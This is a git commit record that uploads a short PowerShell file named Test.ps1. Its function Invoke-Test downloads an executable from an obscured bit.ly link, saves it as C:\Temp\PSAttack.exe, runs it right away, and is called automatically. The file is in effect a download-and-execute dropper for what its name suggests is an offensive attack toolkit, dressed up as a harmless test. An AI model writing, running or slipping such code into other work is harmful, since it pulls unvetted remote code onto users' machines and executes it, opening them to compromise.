2dcbe39b83372fcdba3c8f72fa4e6b12976fb341
caabv <41907756+caabv@users.noreply.github.com>
2019-03-20 09:39:39 +0100

    Add files via upload

---
+++ Test.ps1
@@ -0,0 +1,8 @@
+﻿function Invoke-Test {
+    $src = 'https://bit.ly/2FeUnJ6'
+    $dist = 'C:\Temp\PSAttack.exe'
+    Invoke-WebRequest -Uri $src -OutFile $dist
+    & 'C:\Temp\PSAttack.exe'
+}
+
+Invoke-Test
